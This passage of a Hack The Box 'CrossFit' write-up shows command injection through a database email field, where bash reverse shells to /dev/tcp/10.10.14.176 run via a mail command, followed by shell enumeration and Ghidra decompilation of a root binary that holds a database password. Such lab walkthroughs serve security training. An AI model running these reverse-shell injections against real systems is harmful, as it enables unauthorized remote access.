</pre></table></code></div></div><p>After some testing I found out that I needed to trigger the message by uploading a file into the <code class="language-plaintext highlighter-rouge">messages</code> folder after logging in with <code class="language-plaintext highlighter-rouge">ftpadm</code>. It did not seem to matter what the file was.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>MariaDB [crossfit]&gt; INSERT INTO users (id,email) VALUES (8081,"-E $(bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.176/8081 0&gt;&amp;1')");
Query OK, 1 row affected (0.001 sec)

MariaDB [crossfit]&gt; select * from users;
+------+------------------------------------------------------------+
| id   | email                                                      |
+------+------------------------------------------------------------+
| 8081 | -E $(bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.176/8081 0&gt;&amp;1') |
+------+------------------------------------------------------------+
1 row in set (0.000 sec)
</pre></table></code></div></div><p>I changed ports and tried inserting my reverse shell again, and this time got a steady connection.</p><div class="language-sql highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">MariaDB</span> <span class="p">[</span><span class="n">crossfit</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">INSERT</span> <span class="k">INTO</span> <span class="n">users</span> <span class="p">(</span><span class="n">email</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="nv">"test &amp; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.176/10001 0&gt;&amp;1'"</span><span class="p">);</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="k">row</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>
</pre></table></code></div></div><p>I lost my connection again due to an “unplanned network outage”, so had to try again. I forgot about the <code class="language-plaintext highlighter-rouge">-E</code> flag when I came back to this and found another way to get my code to execute. Chaining bash commands using <code class="language-plaintext highlighter-rouge">&amp;</code> also worked.</p><h3 id="enumeration-as-isaac">Enumeration as <code class="language-plaintext highlighter-rouge">isaac</code></h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/crossfit]
└─$ nc -lvnp 10001                                                                                   1 ⨯
listening on [any] 10001 ...
connect to [10.10.14.176] from (UNKNOWN) [10.10.10.208] 54756
bash: cannot set terminal process group (2913): Inappropriate ioctl for device
bash: no job control in this shell
isaac@crossfit:~$
</pre></table></code></div></div><p>I finally got a shell back after triggering it by uploading a file to the ftp server.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>isaac@crossfit:~$ id
id
uid=1000(isaac) gid=1000(isaac) groups=1000(isaac),50(staff),116(ftp),1005(admins)
</pre></table></code></div></div><p>There was a new group <code class="language-plaintext highlighter-rouge">staff</code> that had access to a bunch of files related to selenium.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>isaac@crossfit:~<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
isaac@crossfit:~<span class="nv">$ </span>^Z  
<span class="o">[</span>1]+  Stopped                 nc <span class="nt">-lvnp</span> 9001
zweilos@kali:~/htb/laboratory<span class="nv">$ </span><span class="nb">stty </span>size
23 103
zweilos@kali:~/htb/laboratory<span class="nv">$ </span><span class="nb">stty </span>raw <span class="nt">-echo</span>
nc <span class="nt">-lvnp</span> 9001aa:~/htb/laboratory<span class="nv">$ </span>

isaac@crossfit:~<span class="nv">$ </span><span class="nb">stty </span>rows 23 columns 103
isaac@crossfit:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm-256color
</pre></table></code></div></div><p>Next, I upgraded to full PTY shell.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>isaac@crossfit:~/send_updates$ cd includes
cd includes
isaac@crossfit:~/send_updates/includes$ ls -la
ls -la
total 20
drwxr-x--- 2 isaac isaac  4096 May  7  2020 .
drwxr-x--- 4 isaac admins 4096 May  9  2020 ..
-rw-r----- 1 isaac isaac    41 May  7  2020 config.php
-rw-r----- 1 isaac isaac   151 May  5  2020 db.php
-rw-r----- 1 isaac isaac   520 May  5  2020 functions.php
</pre></table></code></div></div><p>I did some investigating to figure out why I had to upload a file to get the code to execute</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nv">$msg_dir</span> <span class="o">=</span> <span class="s2">"/srv/ftp/messages"</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>In the <code class="language-plaintext highlighter-rouge">includes</code> folder there was a file <code class="language-plaintext highlighter-rouge">config.php</code> that pointed to <code class="language-plaintext highlighter-rouge">/srv/ftp/messages</code>. This was the variable I had seen in the <code class="language-plaintext highlighter-rouge">send_updates.php</code> script.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="n">cleanup</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">require</span><span class="p">(</span><span class="s2">"db.php"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$conn</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$res</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s1">'SELECT email FROM users'</span><span class="p">);</span>
        <span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$res</span><span class="o">-&gt;</span><span class="nf">fetch_array</span><span class="p">(</span><span class="no">MYSQLI_ASSOC</span><span class="p">))</span>
        <span class="p">{</span>
            <span class="nv">$email</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'email'</span><span class="p">];</span>
            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$email</span><span class="p">,</span> <span class="no">FILTER_VALIDATE_EMAIL</span><span class="p">))</span>
            <span class="p">{</span>
                <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"DELETE FROM users WHERE email=?"</span><span class="p">;</span>
                <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="nf">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
                <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">bind_param</span><span class="p">(</span><span class="s2">"s"</span><span class="p">,</span> <span class="nv">$email</span><span class="p">);</span>
                <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="nf">execute</span><span class="p">();</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><p>The file <code class="language-plaintext highlighter-rouge">functions.php</code> explained why my query would be deleted from the database every so often.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>isaac@crossfit:~/send_updates/vendor/composer$ ps aux
ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
isaac     2913  0.0  0.0   2388   692 ?        Ss   16:55   0:00 /bin/sh -c /usr/bin/php /home/isaac/send_updates/send_updates.php
isaac     2914  0.3  0.5  89096 22692 ?        S    16:55   0:10 /usr/bin/php /home/isaac/send_updates/send_updates.php
isaac     2922  0.0  0.0   2388   760 ?        S    16:55   0:00 sh -c /usr/bin/mail -s 'CrossFit Club Newsletter' -E $(bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.176/8081 0&gt;&amp;1') '1'
isaac     2924  0.0  0.0   6644  3136 ?        S    16:55   0:00 bash -c bash -i &gt;&amp; /dev/tcp/10.10.14.176/8081 0&gt;&amp;1
isaac     2925  0.0  0.1   7900  4604 ?        S    16:55   0:00 bash -i
isaac     3303  0.0  0.0   2388   696 ?        Ss   17:27   0:00 /bin/sh -c /usr/bin/php /home/isaac/send_updates/send_updates.php
isaac     3304  0.3  0.5  89096 22520 ?        S    17:27   0:02 /usr/bin/php /home/isaac/send_updates/send_updates.php
isaac     3306  0.0  0.0   2388   748 ?        S    17:27   0:00 sh -c /usr/bin/mail -s 'CrossFit Club Newsletter' ;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.176/10001 0&gt;&amp;1' '1'
isaac     3308  0.0  0.0   6644  3236 ?        S    17:27   0:00 bash -c bash -i &gt;&amp; /dev/tcp/10.10.14.176/10001 0&gt;&amp;1 1
isaac     3309  0.0  0.1   7764  4336 ?        S    17:27   0:00 bash -i
isaac     3557  0.0  0.0  10632  3144 ?        R    17:42   0:00 ps aux
</pre></table></code></div></div><p>In the process output I could see my reverse shells (I tried two different methods), but nothing else that was useful.</p><h3 id="dbmsg">dbmsg</h3><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
</pre><td class="rouge-code"><pre>2021/01/15 18:51:01 FS:                 OPEN | /usr/bin/dbmsg
2021/01/15 18:51:01 FS:               ACCESS | /usr/bin/dbmsg
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/ld-2.28.so
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/ld-2.28.so
2021/01/15 18:51:01 FS:                 OPEN | /etc/ld.so.cache
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libmariadb.so.3
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libmariadb.so.3
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libzip.so.4.0
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libzip.so.4.0
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libc-2.28.so
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libc-2.28.so
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libpthread-2.28.so
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libpthread-2.28.so
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libz.so.1.2.11
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libdl-2.28.so
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libdl-2.28.so
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libm-2.28.so
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libm-2.28.so
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libgnutls.so.30.23.2
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libgnutls.so.30.23.2
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libbz2.so.1.0.4
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libbz2.so.1.0.4
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libssl.so.1.1
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libssl.so.1.1
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libp11-kit.so.0.3.0
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libidn2.so.0.3.6
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libunistring.so.2.1.0
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libtasn1.so.6.5.5
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libtasn1.so.6.5.5
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libnettle.so.6.5
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libnettle.so.6.5
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libhogweed.so.4.5
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libhogweed.so.4.5
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libgmp.so.10.3.2
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libgmp.so.10.3.2
2021/01/15 18:51:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/libffi.so.6.0.4
2021/01/15 18:51:01 FS:               ACCESS | /usr/lib/x86_64-linux-gnu/libffi.so.6.0.4
</pre></table></code></div></div><p>I tried using pspy (with the <code class="language-plaintext highlighter-rouge">-f</code> flag to see files as they are accessed) to see if it was just <code class="language-plaintext highlighter-rouge">ps</code> that was being restricted, and I noticed the program <code class="language-plaintext highlighter-rouge">dbmsg</code> that I didn’t recognize.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>isaac@crossfit:~$ man dbmsg
man dbmsg
No manual entry for dbmsg
</pre></table></code></div></div><p>There was no man page, and after looking around on the internet for awhile and not finding anything I figured it must be a home-brewed application.</p><div class="language-text highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>isaac@crossfit:~$ strings /bin/dbmsg
...snipped...
crossfit
oeLoo~y2baeni
localhost
SELECT * FROM messages
/var/backups/mariadb/comments.zip
%d%s
Adding file %s
This program must be run as root.
...snipped...
</pre></table></code></div></div><p>A quick peek into the strings inside the file proved this to be true.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="n">__uid_t</span> <span class="n">_Var1</span><span class="p">;</span>
  <span class="kt">time_t</span> <span class="n">tVar2</span><span class="p">;</span>

  <span class="n">_Var1</span> <span class="o">=</span> <span class="n">geteuid</span><span class="p">();</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">_Var1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">fwrite</span><span class="p">(</span><span class="s">"This program must be run as root.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x22</span><span class="p">,</span><span class="n">stderr</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">tVar2</span> <span class="o">=</span> <span class="n">time</span><span class="p">((</span><span class="kt">time_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">);</span>
  <span class="n">srand</span><span class="p">((</span><span class="n">uint</span><span class="p">)</span><span class="n">tVar2</span><span class="p">);</span>
  <span class="n">process_data</span><span class="p">();</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
  <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>I exfiltrated the binary to my system and opened the program in <a href="https://ghidra-sre.org/">ghidra</a>. After locating the <code class="language-plaintext highlighter-rouge">main()</code> function, I saw that it ran as root. This looked to be a good bet for escalation of privileges. The program appeared to check the current system time, create a random number using the time as a seed, then run the <code class="language-plaintext highlighter-rouge">process_data()</code> function.</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
</pre><td class="rouge-code"><pre><span class="kt">void</span> <span class="nf">process_data</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
  <span class="n">uint</span> <span class="n">uVar2</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">lVar3</span><span class="p">;</span>
  <span class="n">undefined8</span> <span class="n">uVar4</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">sVar5</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_f8</span> <span class="p">[</span><span class="mi">48</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">local_c8</span> <span class="p">[</span><span class="mi">48</span><span class="p">];</span>
  <span class="kt">char</span> <span class="n">local_98</span> <span class="p">[</span><span class="mi">48</span><span class="p">];</span>
  <span class="n">undefined</span> <span class="n">local_68</span> <span class="p">[</span><span class="mi">28</span><span class="p">];</span>
  <span class="n">undefined4</span> <span class="n">local_4c</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">local_48</span><span class="p">;</span>
  <span class="kt">FILE</span> <span class="o">*</span><span class="n">local_40</span><span class="p">;</span>
  <span class="kt">long</span> <span class="o">*</span><span class="n">local_38</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">local_30</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">local_28</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">local_20</span><span class="p">;</span>

  <span class="n">local_20</span> <span class="o">=</span> <span class="n">mysql_init</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_20</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">fwrite</span><span class="p">(</span><span class="s">"mysql_init() failed</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x14</span><span class="p">,</span><span class="n">stderr</span><span class="p">);</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">lVar3</span> <span class="o">=</span> <span class="n">mysql_real_connect</span><span class="p">(</span><span class="n">local_20</span><span class="p">,</span><span class="s">"localhost"</span><span class="p">,</span><span class="s">"crossfit"</span><span class="p">,</span><span class="s">"oeLoo~y2baeni"</span><span class="p">,</span><span class="s">"crossfit"</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">lVar3</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">exit_with_error</span><span class="p">(</span><span class="n">local_20</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">mysql_query</span><span class="p">(</span><span class="n">local_20</span><span class="p">,</span><span class="s">"SELECT * FROM messages"</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">exit_with_error</span><span class="p">(</span><span class="n">local_20</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">local_28</span> <span class="o">=</span> <span class="n">mysql_store_result</span><span class="p">(</span><span class="n">local_20</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_28</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">exit_with_error</span><span class="p">(</span><span class="n">local_20</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">local_30</span> <span class="o">=</span> <span class="n">zip_open</span><span class="p">(</span><span class="s">"/var/backups/mariadb/comments.zip"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">local_4c</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">local_30</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">local_38</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="n">mysql_fetch_row</span><span class="p">(</span><span class="n">local_28</span><span class="p">),</span> <span class="n">local_38</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">((((</span><span class="o">*</span><span class="n">local_38</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_38</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_38</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_38</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">lVar3</span> <span class="o">=</span> <span class="o">*</span><span class="n">local_38</span><span class="p">;</span>
        <span class="n">uVar2</span> <span class="o">=</span> <span class="n">rand</span><span class="p">();</span>
        <span class="n">snprintf</span><span class="p">(</span><span class="n">local_c8</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="s">"%d%s"</span><span class="p">,(</span><span class="n">ulong</span><span class="p">)</span><span class="n">uVar2</span><span class="p">,</span><span class="n">lVar3</span><span class="p">);</span>
        <span class="n">sVar5</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">local_c8</span><span class="p">);</span>
        <span class="n">md5sum</span><span class="p">(</span><span class="n">local_c8</span><span class="p">,</span><span class="n">sVar5</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">,</span><span class="n">local_f8</span><span class="p">,</span><span class="n">sVar5</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">);</span>
        <span class="n">snprintf</span><span class="p">(</span><span class="n">local_98</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="s">"%s%s"</span><span class="p">,</span><span class="s">"/var/local/"</span><span class="p">,</span><span class="n">local_f8</span><span class="p">);</span>
        <span class="n">local_40</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">local_98</span><span class="p">,</span><span class="s">"w"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">local_40</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">FILE</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
          <span class="n">fputs</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_38</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="n">local_40</span><span class="p">);</span>
          <span class="n">fputc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="n">local_40</span><span class="p">);</span>
          <span class="n">fputs</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_38</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span><span class="n">local_40</span><span class="p">);</span>
          <span class="n">fputc</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="n">local_40</span><span class="p">);</span>
          <span class="n">fputs</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">local_38</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="n">local_40</span><span class="p">);</span>
          <span class="n">fclose</span><span class="p">(</span><span class="n">local_40</span><span class="p">);</span>
          <span class="k">if</span> <span class="p">(</span><span class="n">local_30</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Adding file %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">local_98</span><span class="p">);</span>
            <span class="n">local_48</span> <span class="o">=</span> <span class="n">zip_source_file</span><span class="p">(</span><span class="n">local_30</span><span class="p">,</span><span class="n">local_98</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">local_48</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
              <span class="n">uVar4</span> <span class="o">=</span> <span class="n">zip_strerror</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
              <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">uVar4</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="k">else</span> <span class="p">{</span>
              <span class="n">lVar3</span> <span class="o">=</span> <span class="n">zip_file_add</span><span class="p">(</span><span class="n">local_30</span><span class="p">,</span><span class="n">local_f8</span><span class="p">,</span><span class="n">local_48</span><span class="p">);</span>
              <span class="k">if</span> <span class="p">(</span><span class="n">lVar3</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">zip_source_free</span><span class="p">(</span><span class="n">local_48</span><span class="p">);</span>
                <span class="n">uVar4</span> <span class="o">=</span> <span class="n">zip_strerror</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">uVar4</span><span class="p">);</span>
              <span class="p">}</span>
              <span class="k">else</span> <span class="p">{</span>
                <span class="n">uVar4</span> <span class="o">=</span> <span class="n">zip_strerror</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
                <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">uVar4</span><span class="p">);</span>
              <span class="p">}</span>
            <span class="p">}</span>
          <span class="p">}</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">mysql_free_result</span><span class="p">(</span><span class="n">local_28</span><span class="p">);</span>
    <span class="n">delete_rows</span><span class="p">(</span><span class="n">local_20</span><span class="p">);</span>
    <span class="n">mysql_close</span><span class="p">(</span><span class="n">local_20</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">local_30</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">zip_close</span><span class="p">(</span><span class="n">local_30</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">delete_files</span><span class="p">();</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">zip_error_init_with_code</span><span class="p">(</span><span class="n">local_68</span><span class="p">,</span><span class="n">local_4c</span><span class="p">,</span><span class="n">local_4c</span><span class="p">);</span>
